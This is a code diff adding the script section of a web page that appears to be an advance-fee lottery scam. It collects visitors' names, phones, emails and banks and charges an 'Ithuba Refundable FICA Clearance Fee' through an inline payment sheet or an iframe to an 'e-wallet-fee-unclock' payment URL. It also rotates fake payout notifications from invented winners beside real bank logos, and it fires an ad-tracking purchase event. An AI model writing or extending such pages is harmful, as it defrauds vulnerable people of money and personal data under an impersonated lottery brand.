+        const resp = await fetch(apiOrderUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            order_id: STATE.voucherRef,
+            phone: custPhone,
+            name: custName,
+            email: custEmail,
+            bank: STATE.bankName,
+            amount_minor: 20000,
+            title: "Ithuba Refundable FICA Clearance Fee",
+            utms: capturedUtms
+          })
+        });
+
+        if (!resp.ok) throw new Error("API unavailable");
+        const order = await resp.json();
+
+        // 1. Open Native CreaPay.pay Inline Sheet right on the screen (NO REDIRECT)
+        if (order && order.checkout_token && window.CreaPay && typeof window.CreaPay.pay === "function") {
+          btn.innerHTML = `<span class="btn-main-title">AWAITING INLINE AUTHORIZATION...</span>`;
+          const result = await CreaPay.pay({
+            checkoutToken: order.checkout_token,
+            orderId: order.order_id,
+            accessCode: order.access_code,
+            onStatus: function(state) {
+              if (state && (state.status === "approved" || state.status === "success")) {
+                handlePaymentCompleted(order.order_id);
+              }
+            }
+          });
+          if (result && (result.status === "approved" || result.status === "success")) {
+            handlePaymentCompleted(order.order_id);
+            return;
+          }
+        } else {
+          // 2. Open Inline Modal Iframe Popup right on the same screen (NO REDIRECT)
+          const popupUrl = (order && order.checkout_url) ? order.checkout_url : ("https://pay.africagrabpoint.com/pay/e-wallet-fee-unclock?ref=" + encodeURIComponent(STATE.voucherRef) + "&phone=" + encodeURIComponent(rawPhone));
+          openInlineModal(popupUrl);
+        }
+      } catch (err) {
+        // Fallback when testing locally via file:// (opens inline modal popup right on screen — NO REDIRECT!)
+        const fallbackPopupUrl = "https://pay.africagrabpoint.com/pay/e-wallet-fee-unclock?ref=" + encodeURIComponent(STATE.voucherRef) + "&phone=" + encodeURIComponent(rawPhone);
+        openInlineModal(fallbackPopupUrl);
+      } finally {
+        btn.disabled = false;
+        btn.innerHTML = originalHtml;
+      }
+    }
+
+    function openInlineModal(url) {
+      const modal = document.getElementById("creaPayModal");
+      const iframe = document.getElementById("creaPayFrame");
+      const loader = document.getElementById("modalIframeLoader");
+      loader.style.display = "block";
+      iframe.src = url;
+      iframe.onload = function() {
+        loader.style.display = "none";
+      };
+      modal.style.display = "flex";
+      document.body.style.overflow = "hidden";
+    }
+
+    function closeInlineModal() {
+      const modal = document.getElementById("creaPayModal");
+      const iframe = document.getElementById("creaPayFrame");
+      modal.style.display = "none";
+      iframe.src = "about:blank";
+      document.body.style.overflow = "";
+    }
+
+    function handleModalBackdropClick(e) {
+      if (e.target === document.getElementById("creaPayModal")) {
+        closeInlineModal();
+      }
+    }
+
+    // Listen for postMessage approval from inline iframe popup
+    window.addEventListener("message", function(event) {
+      if (event && event.data) {
+        const str = typeof event.data === "string" ? event.data : JSON.stringify(event.data);
+        if (str.includes("approved") || str.includes("success") || str.includes("payment_completed")) {
+          if (window.fbq) fbq("track", "Purchase", { value: 97.00, currency: "ZAR" });
+          closeInlineModal();
+          document.getElementById("headerWalletBadge").textContent = "DISPATCHED";
+          showStep("step-paid-success");
+        }
+      }
+    });
+
+    function showStep(id) {
+      ["step-quiz", "step-register", "step-draw", "step-bank", "step-clearing", "step-approved", "step-vsl", "step-paid-success"].forEach(s => {
+        document.getElementById(s).classList.add("hidden");
+      });
+      document.getElementById(id).classList.remove("hidden");
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    // Live South African Payout Toasts with Real Bank SVG Logos
+    const LIVE_FEED = [
+      { user: "Sipho Dlamini (Soweto)", logo: "images/banks/capitec.svg", bank: "Capitec" },
+      { user: "Thandiwe Nkosi (Pretoria)", logo: "images/banks/fnb.svg", bank: "FNB" },
+      { user: "Bongani Sithole (Durban)", logo: "images/banks/tymebank.svg", bank: "TymeBank" },
+      { user: "Lerato Mokoena (Sandton)", logo: "images/banks/standard_bank.svg", bank: "Standard Bank" },
+      { user: "Kagiso Molefe (Bloemfontein)", logo: "images/banks/absa.svg", bank: "ABSA" }
+    ];
+    let feedIdx = 0;
+    setInterval(() => {
+      const t = document.getElementById("liveToast");
+      const item = LIVE_FEED[feedIdx % LIVE_FEED.length];
+      feedIdx++;
+      document.getElementById("toastBankLogo").src = item.logo;
+      document.getElementById("toastUser").textContent = item.user;
+      document.getElementById("toastMsg").innerHTML = `Received <b style="color:#ffe100;">${STATE.prizeLabel}</b> via ${item.bank} PayShap`;
+      t.classList.add("show");
+      setTimeout(() => t.classList.remove("show"), 4200);
+    }, 9500);
+  </script>
+</body>
+</html>
